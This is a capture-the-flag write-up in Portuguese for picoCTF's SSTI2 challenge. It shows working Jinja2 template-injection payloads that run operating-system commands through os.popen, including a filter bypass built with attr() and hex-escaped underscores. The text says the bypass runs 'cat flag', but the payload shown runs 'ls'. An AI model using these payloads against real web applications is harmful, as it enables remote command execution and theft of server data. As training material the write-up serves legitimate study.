

# SSTI2
###### Solved by @Mayaracar2
> This is a CTF about SSTI, Web Exploitation
## Desafio: SSTI2 (Exploração Web) 
### Introdução
O desafio apresenta o seguinte enunciado: 

"I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
I heard templating is a cool and modular way to build web apps! Check out my website here!"

#### Tradução
"Criei um site bacana onde você pode anunciar o que quiser! Li sobre a higienização de entradas, então agora removo qualquer tipo de caractere que possa ser um problema :)
Ouvi dizer que criar templates é uma maneira legal e modular de criar aplicativos web! Confira meu site aqui !"

- [Página do desafio](https://play.picoctf.org/practice/challenge/488)
### Análise inicial
O link do desafio direciona para uma aplicação web simples onde o usuário pode submeter um texto de anúncio que é renderizado pelo servidor:

- [Link do site](http://shape-facility.picoctf.net:62755/)

A tarefa consiste em verificar se a entrada do usuário é avaliada por um motor de templates (SSTI) e, se positivo, explorar essa avaliação para extrair a flag presente no sistema.

## Solução
Ao acessar a página, foi observado um formulário de input para os anúncios:

<img width="508" height="230" alt="image" src="https://github.com/user-attachments/assets/b16c95bb-8ec0-441d-9b5e-0d3c54c00c3f" />

Para testar se o campo era interpretado pelo motor de templates, foi enviada uma expressão aritmética típica de templates:

```bash
{{7*7}}
```

A aplicação retornou `49`, confirmando que o conteúdo entre `{{ ... }}` é avaliado no servidor, indício claro de Server-Side Template Injection (SSTI).

<img width="924" height="350" alt="image" src="https://github.com/user-attachments/assets/e66cb5c0-cd17-4cf1-b463-cf18d51ad1f2" />

Com a confirmação de SSTI, o atacante pode navegar pelos objetos expostos ao template para alcançar funções perigosas do ambiente Python. O payload utilizado explora a introspecção do objeto `request` para acessar `__builtins__`, importar o módulo os e executar um comando do sistema para ler o arquivo da flag:

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

<img width="1360" height="528" alt="image" src="https://github.com/user-attachments/assets/c3d78286-fd04-4107-bde5-8fb48e195916" />

O filtro do servidor bloqueava literais como `__globals__`, mas não impedia escapes em hexadecimal. 

Para contornar o bloqueio de literais, o payload utiliza `attr` e `__getitem__` combinados com underscores codificados em hexadecimal. Isso permite construir dinamicamente os nomes de atributos e funções restritas:


```bash
	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

O payload é executado pelo motor de template, contornando o filtro, importando os, executando cat flag e retornando o conteúdo da flag:

<img width="1361" height="401" alt="image" src="https://github.com/user-attachments/assets/1638c443-a0f4-4dba-a2ef-d7c52980365e" />

>`picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}`

## Conclusão
O desafio demonstrou como um motor de templates que avalia entradas do usuário pode ser explorado mesmo quando há filtros básicos. Ao usar codificação hexadecimal e chamadas dinâmicas de atributos (attr e __getitem__), foi possível contornar a filtragem, acessar __builtins__ e executar comandos do sistema para ler a flag.
